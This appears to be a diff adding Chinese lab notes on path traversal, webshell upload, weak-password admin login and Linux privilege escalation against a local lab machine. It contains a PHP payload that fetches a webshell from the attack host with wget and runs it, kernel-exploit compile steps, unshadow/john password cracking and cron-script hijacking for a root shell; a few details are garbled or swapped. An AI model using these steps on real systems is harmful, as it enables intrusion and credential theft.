@@ -1,0 +1,52 @@
+路径遍历(目录遍历)
+    
+    简介
+    	路径遍历攻击也称为目录遍历，旨在，访问存储在web根文件夹之外的文件和目录
+    	通过操纵带有点-斜线(…)序列及其变化的文件或使用绝对路径来引用文件的变量，来访问存储在文件系统上的任意文件和目录，包括应用程序源代码、配置和关键系统文件
+    	需要注意的是，系统访问控制(如在微软Windows操作系统上锁定或使用文件)限制了对文件的访问权限
+    	靶机：192.168.1.113
+    	攻击机：192.168.1.110
+    	owasp-zap web漏洞扫描器，自动挖掘web应用程序中的漏洞
+    	高危漏洞path traversal
+    	打开之后发现一串代码，这是返回etc/passwd/的文件信息，接下来在浏览器中把passswd修改为shadow就可以查看该站点shadow的文件内容，但是发现并没有返回shadow的对应信息，因为服务器设置的shadow是不可用的，修改路径可以得到不同的内容，只要该路径下存在该内容，或者该文件设置的对应权限是可读的
+
+    利用目录遍历漏洞获取shell思路
+    	* 上传webshell到服务器
+    	* 之后通过对应的目录遍历路径访问webshell，执行webshell
+    	* 在kali linux当中获取反弹shell
+    	dbadmin敏感目录有敏感页面，浏览器访问，使用弱口令尝试登陆
+    	弱口令有字母型和数字型
+    	字母型是用123456作为对应的用户名和密码， 数字型是用admin作为用户名和密码
+    	使用admin进行登录可以进入系统后台
+    	在系统后台新建数据库，数据表，字段(写入<?php system("cd /tmp;wget http://192.168.1.110:8000/webshell.php;chmod +x webshell.php;php webshell");?>)
+    	创建服务器用于靶场机器下载对应webshell
+
+    提权
+    	提权前提：已经拿到低权shell，被入侵机器上有nc,python,perl等工具，有权限上传文件和下载文件
+    	内核溢出漏洞提权，先对系统相关信息收集
+    	查看发行版本
+    		* cat/etc/issue
+    		* cat/etc/*-release
+    	查看内核版本
+    		* uname -a
+    	寻找内核溢出代码
+    	searchsploit 发行版本 内核版本
+    	上传内核溢出代码，编译执行
+    		* gcc xxx.c -o exploit
+    		* chmod +x exploit
+    		* ./exploit
+    	明文root密码提权
+    		大多数Linux系统密码都和/etc/passwd和/etc/shadow这两个配置文件息息相关
+    		passwd存储了用户，shadow存储了密码的hash
+    		出于安全考虑passwd是全用户可读，root可写，shadow是仅root可读写的
+
+    破解用户名和密码
+    	unshadow passwd shadow > cracked
+    	john cracked
+    	计划任务
+    	计划任务是一些定时执行的任务，由crontab管理，具有所属用户的权限，非root权限用户是不可以列出root用户的计划任务的，但/etc/内系统的计划任务可以被列出
+    	默认这些程序由root权限执行，若有幸可将其中脚本配置成任意用户可写的管理员，即可修改脚本连回rootshell，若定时执行的文件是py脚本，可使用脚本来替换之前的脚本
+    	靶场代码之前有写出来过
+
+    密码复用
+    	很多管理员会使用相同密码，即数据库或后台密码即是root密码
